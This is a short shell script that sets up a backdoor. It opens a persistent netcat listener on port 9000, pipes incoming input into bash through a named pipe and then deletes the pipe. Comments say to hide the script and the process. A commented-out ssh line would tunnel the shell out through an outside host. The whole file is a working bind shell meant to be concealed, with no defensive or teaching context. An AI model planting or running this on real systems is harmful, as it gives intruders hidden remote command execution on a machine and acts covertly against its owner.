#!/bin/sh

#TODO: hide this script

#hide this process
localPort=9000

#ssh -R 9012:localhost:$localPort kit100@shell.cjb.net &
mkfifo file
nc -l -k "$localPort" < file | bash >file & # uses named pipe
sleep 1
rm file

#TODO GET OUTPUT





